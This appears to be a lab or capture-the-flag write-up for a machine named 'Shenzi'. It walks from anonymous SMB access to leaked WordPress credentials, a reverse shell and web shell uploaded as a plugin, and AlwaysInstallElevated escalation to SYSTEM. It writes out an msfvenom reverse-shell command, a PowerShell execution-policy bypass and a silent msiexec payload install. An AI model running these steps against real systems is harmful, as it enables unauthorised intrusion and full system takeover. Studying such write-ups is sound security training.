# {{Shenzi}}


# Resolution summary
- Utilized smbclient to locate an smb share and found we were able to login as null with no password
- Found a passwords.txt file in the share
- Password.txt file contained wordpress credentials
- As the share was called Shenzi i attempted to navigate to http://192.168.142.55/shenzi and found a wordpress site
- Found an admin link and was directed to an admin login page
- Logged into the admin page with the found credentials in the smb share
- Navigated to upload plugin page
- Uploaded a reverse shell on the plugin page
- Set up a netcat listener on kali machine
- Navigated to  "/wp-content/uploads" as it is a common Wordpress directory to have access to
- Navigated to the folder with the reverse shell
- Clicked on the reverse shell but received no reverse shell
- Created a White Winterwolf Web Shell and uploaded it into the plugin page

#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=445 -f exe > reverse.exe" to create the reverse shell payload on my kali machine:

![](Pasted%20image%2020221108095611.png)

#### - Started a netcat listener on my kali machine on port 445

#### -Clicked "upload plugin":

![](Pasted%20image%2020221108095717.png)

#### -Clicked "browse" and chose my reverse shell payload on kali machine to upload and clicked "install now":

![](Pasted%20image%2020221108100619.png)

#### - I was unable to execute the reverse shell from there so I downloaded a windows webshell found from https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php and typed "whoami" and found we had remote code execution:

# Privilege Escalation
## Local Enumeration

#### - Downloaded PrivescCheck.ps1 into user Shenzi's directory

#### - Typed powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" on CMD prompt to run the "PrivescCheck.ps1" script and received the following Report showing "AlwaysInstallElevated" as High:

## Privilege Escalation vector
## Always Install Elevated Privilege Escalation

#### - Uploaded the reverse shell msi payload onto target machine

#### - Started a netcat listener on kali machine listening on port 443

#### - Per the "Windows Privelege Escalation (alwaysinstalleleveated)" webpage I typed "msiexec /quiet /qn /i [file name]" to run the reverse shell payload onto the target and received a shell running as NT/Authority System:
